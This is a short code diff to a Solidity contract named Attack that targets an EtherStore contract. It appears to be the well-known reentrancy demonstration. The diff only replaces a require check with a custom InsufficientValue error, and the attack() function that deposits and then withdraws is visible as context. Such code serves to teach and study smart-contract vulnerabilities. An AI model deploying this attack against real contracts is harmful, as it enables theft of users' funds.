@@ -8,6 +8,8 @@ contract Attack {
     EtherStore public etherStore;
     uint256 public constant AMOUNT = 1 ether;
 
+    error InsufficientValue(uint256 value, uint256 amount);
+
     constructor(address _etherStoreAddress) {
         etherStore = EtherStore(_etherStoreAddress);
     }
@@ -26,7 +28,9 @@ contract Attack {
     }
 
     function attack() external payable {
-        require(msg.value >= AMOUNT);
+        if (msg.value < AMOUNT) {
+            revert InsufficientValue(msg.value, AMOUNT);
+        }
         etherStore.deposit{value: AMOUNT}();
         etherStore.withdraw();
     }
